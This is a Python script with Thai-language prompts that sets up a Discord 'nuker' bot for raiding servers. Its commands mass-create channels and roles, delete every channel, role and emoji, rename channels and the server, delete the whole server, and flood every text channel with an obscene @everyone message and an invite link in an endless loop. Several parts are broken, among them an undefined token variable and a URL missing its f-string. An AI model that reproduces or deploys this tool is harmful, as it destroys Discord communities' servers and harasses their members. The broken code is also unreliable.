import discord
import os,time
import threading
import requests
from discord.ext import commands
os.system("clear")

choice = input("กรุณาเลือกโหมด(bot-me) : ")
if choice == "bot":
	os.system("clear")
	print("""โหมดที่คุณใช้งานคือ 'Bot'""")
	print("\n")
	token_bot = input("โทเค็นบอท : ")
	bot = commands.Bot(command_prefix="!")
	@bot.event
	async def on_ready():
		os.system("clear")
		print("------")
		print("")
		print(f"  Users  : {bot.user}")
		print(f"  ID      : {bot.user.id}")
		print("")
		print("------")
		print("\n")
		print("________________________________________________")
		print("")
		print("Prefix : !")
		print("")
		print("คำสั่งบอททั้งหมด(ยิงดิส) :")
		print("")
		print("""
		 !sc <ชื่อ> <จำนวน>                   สร้างห้อง
		 !dc   -        -                ลบห้องทั้งหมด
		 !sr <ชื่อ> <จำนวน>            สร้างบทบาท
		 !dr    -        -           ลบบทบาททั้งหมด
		 !ec <ชื่อ>   -               เปลี่ยนชื่อช่องทั้งหมด
		 !eg <ชื่อ>   -            เปลี่ยนชื่อเซิร์ฟเวอร์
		 !de    -        -           ลบอิโมจิทั้งหมด
		 !dg    -        -   ลบเซิร์ฟ(หากเขียนเซิร์ฟไหนจะลบเซิร์ฟนั้น)
		 !sa    -        -              สแปมทุกช่อง
		""")
	@bot.command()
	async def sc(ctx,n,jam:int):
		await ctx.message.delete()
		def delete():
			n2 = n
			a = ctx.guild
			requests.post("https://discord.com/api/v9/guilds/{a.id}/channels",headers={"authorization": f"Bot {token}"},json={"name":n2,"type":0})
		for i in range(jam):
			threading.Thread(target=delete).start()
	@bot.command()
	async def dc(ctx):
		await ctx.message.delete()
		for c in ctx.guild.channels:
			def a():
				requests.delete(f"https://discord.com/api/v9/channels/{c.id}",headers={"authorization": f"Bot {token}"})
			threading.Thread(target=a).start()
	@bot.command()
	async def sr(ctx,n,jam:int):
		await ctx.message.delete()
		for i in range(jam):
			await ctx.create_role(name=n)
	@bot.command()
	async def dr(ctx):
		await ctx.message.delete()
		for r in ctx.guild.roles:
			try:
				await r.delete()
			except:
				pass
	@bot.command
	async def ec(ctx,n):
		await ctx.message.delete()
		for c in ctx.guild.channels:
			await c.edit(name=n)
	@bot.command()
	async def eg(ctx,n):
		await ctx.message.delete()
		await ctx.guild.edit(name=n)
	@bot.command()
	async def de(ctx):
		await ctx.message.delete()
		for emoji in ctx.guild.emojis:
			try:
				await emoji.delete()
			except:
				pass
	@bot.command
	async def dg(ctx):
		await ctx.guild.delete()
	@bot.command()
	async def sa(ctx):
		await ctx.message.delete()
		while True:
			for c in ctx.guild.text_channels:
				def s():
					requests.post(f"https://discord.com/api/v9/channels/{c.id}/messages",headers={"authorization": f"Bot {token}"},json={"content": "@everyone  FUCKED YOU!!!!!!https://discord.gg/PGNaGNcFTh\n"})
				threading.Thread(target=s).start()
				
	bot.run(token_bot)
		
	
			
			
elif choice == "":
	os.system("python Catcher.py")
else:
	print("\n")
	print("The mode you requested does not exist. Please try again.")
	time.sleep(2)
	os.system("python Catcher.py")